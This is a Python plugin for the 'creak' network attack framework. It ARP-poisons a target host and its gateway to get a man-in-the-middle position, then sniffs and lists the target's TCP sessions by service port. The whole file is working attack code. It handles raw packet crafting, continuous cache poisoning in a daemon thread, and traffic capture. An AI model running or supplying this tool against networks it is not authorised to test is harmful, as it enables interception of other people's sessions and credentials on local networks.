#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import time
from threading import Thread
from socket import socket, inet_ntoa, PF_PACKET, SOCK_RAW
import pcap
import dpkt
import creak.config as config
import creak.utils as utils
from baseplugin import BasePlugin

(G, W, R) = (utils.G, utils.W, utils.R)

class Plugin(BasePlugin):

    def init_plugin(self):
        self._set_info(
            author='codep',
            version='1.0',
            description='List all TCP sessions of a (list) of target(s) inside a subnet')
        self._set_required_params(dev=True, target=True, gateway=True, src_mac=False, port=False)
        self._set_root(True)

    def _build_pcap_filter(self, prefix, target):
        """ build the pcap filter based on arguments target and port"""
        pcap_filter = prefix
        if isinstance(target, list):
            pcap_filter = "(%s " % pcap_filter
            for addr in target[:-1]:
                pcap_filter += "%s or " % addr
            pcap_filter += "%s) " % target[-1]
        else:
            pcap_filter += "%s" % target

        return pcap_filter

    def _poison(self, dev, src_mac, gateway, target, delay, stop):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while not stop():
                if config.VERBOSE:
                    self.print_output('%s <-- %s -- %s -- %s --> %s',
                                      gateway, target, dev, gateway, target)
                    if not isinstance(target, list):
                        sock.send(str(utils.build_arp_packet(
                            src_mac, gateway, target)))
                        sock.send(str(utils.build_arp_packet(
                            src_mac, target, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
                    else:
                        for addr in target:
                            sock.send(str(utils.build_arp_packet(src_mac, gateway, addr)))
                            sock.send(str(utils.build_arp_packet(src_mac, addr, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
            sock.close()
        except KeyboardInterrupt:
            self.print_output('\n\rPoisoning interrupted')
            sock.close()

    def _restore(self, dev, gateway, target):
        """ reset arp cache of the target and the router (AP) """
        source_mac = utils.get_mac_by_ip(gateway)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
        if not isinstance(target, list):
            target_mac = utils.get_mac_by_ip(target)
            for _ in xrange(6):
                sock.send(str(utils.build_arp_packet(target_mac, gateway, target)))
                sock.send(str(utils.build_arp_packet(source_mac, target, gateway)))
        else:
            for addr in target:
                target_mac = utils.get_mac_by_ip(addr)
                for _ in xrange(6):
                    sock.send(str(utils.build_arp_packet(target_mac, gateway, addr)))
                    sock.send(str(utils.build_arp_packet(source_mac, addr, gateway)))

    def run(self, kwargs):
        """
        Try to get all TCP sessions of the target
        """
        stop = False
        notorious_services = {
            20: ' ftp-data session',
            21: ' ftp-data session',
            22: ' ssh session',
            23: ' telnet session',
            25: ' SMTP session',
            80: ' HTTP session',
            110: ' POP3 session',
            143: ' IMAP session',
            194: ' IRC session',
            220: ' IMAPv3 session',
            443: ' SSL session',
            445: ' SAMBA session',
            989: ' FTPS session',
            990: ' FTPS session',
            992: ' telnet SSL session',
            993: ' IMAP SSL session',
            994: ' IRC SSL session'
        }

        source = kwargs['src_mac'] if 'src_mac' in kwargs else utils.get_default_gateway_linux()
        pcap_filter = self._build_pcap_filter("ip host ", kwargs['target'])
        if hasattr(kwargs, 'port'):
            pcap_filter += " and tcp port %s" % kwargs['port']
        packets = pcap.pcap(kwargs['dev'])
        packets.setfilter(pcap_filter) # we need only kwargs['target'] packets
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self._poison,
                               args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2, lambda: stop))
        poison_thread.daemon = True
        poison_thread.start()
        self.print_output('Start poisoning on ' + G + kwargs['dev'] + W + ' between ' + G
                          + source + W + ' and ' + R
                          + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')

        def sniff_sessions(packets, stop):
            """
            Sniff TCP sessions of the target
            """
            sessions = {}
            try:
                for _, pkt in packets:
                    if stop():
                        break
                    eth = dpkt.ethernet.Ethernet(pkt)
                    ip_packet = eth.data
                    if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                        tcp = ip_packet.data
                        if tcp.flags != dpkt.tcp.TH_RST:
                            sess = "%-25s <-> %25s" % (inet_ntoa(ip_packet.src) + ":"
                                                       + str(tcp.sport), inet_ntoa(ip_packet.dst) + ":"
                                                       + str(tcp.dport))
                            check = False
                            if sess not in sessions:
                                check = True

                            sessions[sess] = "Others"

                            if tcp.sport in notorious_services:
                                sessions[sess] = notorious_services[tcp.sport]
                            elif tcp.dport in notorious_services:
                                sessions[sess] = notorious_services[tcp.dport]

                            if check:
                                self.print_output(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))

                # self.print_output('Session scan interrupted\n\r')
                # self._restore(kwargs['dev'], kwargs['gateway'], kwargs['target'])
                # utils.set_ip_forward(0)
            except KeyboardInterrupt:
                self.print_output('Session scan interrupted\n\r')
                self._restore(kwargs['dev'], kwargs['gateway'], kwargs['target'])
                utils.set_ip_forward(0)

        sniff_thread = Thread(target=sniff_sessions, args=(packets, lambda: stop))
        sniff_thread.start()
        comm = raw_input()
        if comm == 'q':
            stop = True
            sniff_thread.join()
